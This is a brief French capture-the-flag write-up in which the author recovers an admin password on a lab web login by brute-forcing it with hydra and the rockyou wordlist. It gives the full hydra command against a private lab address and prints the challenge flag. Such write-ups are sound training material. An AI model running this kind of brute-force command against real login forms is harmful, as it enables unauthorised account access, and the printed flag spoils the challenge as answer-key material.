# WRITE UP CHALLENGE 'We will... We will... Rock you !!!' - Rédigé par Hugo

## 1ère étape : Accéder au site

## 2ème étape : Le champ identifiant étant déjà rempli, il ne reste que le mot de passe à trouver

## 3ème étape : Il faut bruteforce le mdp avec hydra
https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/

### Voici la commande avec hydra :
> sudo hydra -l admin -P /home/hugo/Downloads/rockyou.txt 192.168.201.10 -s 23013 http-post-form "/index.php:username=pepe&password=^PASS^:LOOOOOOOOOSER"

### Flag : NHM2I{0182d202-50dd-4f66-925b-d29027488f3f}

